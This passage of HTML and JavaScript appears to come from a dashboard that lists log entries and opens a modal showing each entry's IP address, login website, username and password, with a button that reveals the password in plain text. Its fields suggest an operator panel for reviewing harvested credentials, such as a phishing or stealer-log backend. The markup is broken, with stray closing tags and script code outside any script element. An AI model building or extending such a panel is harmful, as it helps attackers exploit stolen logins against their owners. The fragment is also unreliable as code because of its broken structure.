      <p><strong>IP Address:</strong> <span id="modalIP"></span></p>
      <p><strong>Login Website:</strong> <span id="modalWebsite"></span></p>
    </div>
    <div class="mt-4 space-y-3">
      <div>
        <p class="text-sm text-gray-500">Username / Email</p>
        <p id="modalUsername" class="text-md font-medium text-gray-800 bg-gray-100 rounded-md p-2 px-3 break-words"></p>
      </div>
      <div>
        <p class="text-sm text-gray-500 mb-1">Password</p>
        <div class="relative">
          <input id="modalPassword" type="password" class="w-full text-md font-medium text-gray-800 bg-gray-100 rounded-md p-2 px-3 pr-10" readonly />
          <button type="button" onclick="togglePassword()" class="absolute right-2 top-1/2 transform -translate-y-1/2 text-gray-600 hover:text-black">

</div>

            </div>

          <div class="relative">

  $(document).ready(function () {
    $('#logsTable').DataTable();
  });

  function toggleDropdown(button) {
    document.querySelectorAll(".dropdown").forEach(d => {
      if (d !== button.nextElementSibling) d.classList.add("hidden");
    });
    const dropdown = button.nextElementSibling;
    dropdown.classList.toggle("hidden");
  }

  document.addEventListener("click", function (e) {
    if (!e.target.closest("td")) {
      document.querySelectorAll(".dropdown").forEach(d => d.classList.add("hidden"));
    }
  });

  function showCredentials(userId, logLink) {
  const data = credentials[userId] || { username: "N/A", password: "N/A" };
  const ipMap = {
    1: "192.168.1.21",
    2: "192.168.1.22",
    3: "192.168.1.23",
    4: "192.168.1.24"
  };

  const loginDomain = logLink ? new URL(logLink).hostname : "Unknown";

  document.getElementById("modalUserId").textContent = `User ${userId}`;
  document.getElementById("modalIP").textContent = ipMap[userId] || "Unknown IP";
  document.getElementById("modalWebsite").textContent = loginDomain;
  document.getElementById("modalUsername").textContent = data.username;
  document.getElementById("modalPassword").type = "password";
  document.getElementById("modalPassword").value = data.password;
  document.getElementById("eyeIcon").className = "fas fa-eye";
  document.getElementById("dataModal").classList.remove("hidden");
}

  function closeModal() {
    document.getElementById("dataModal").classList.add("hidden");
  }

  function togglePassword() {
  const passInput = document.getElementById("modalPassword");
  const icon = document.getElementById("eyeIcon");
  if (passInput.type === "password") {
    passInput.type = "text";
    icon.className = "fas fa-eye-slash";
  } else {
    passInput.type = "password";
    icon.className = "fas fa-eye";
  }
}
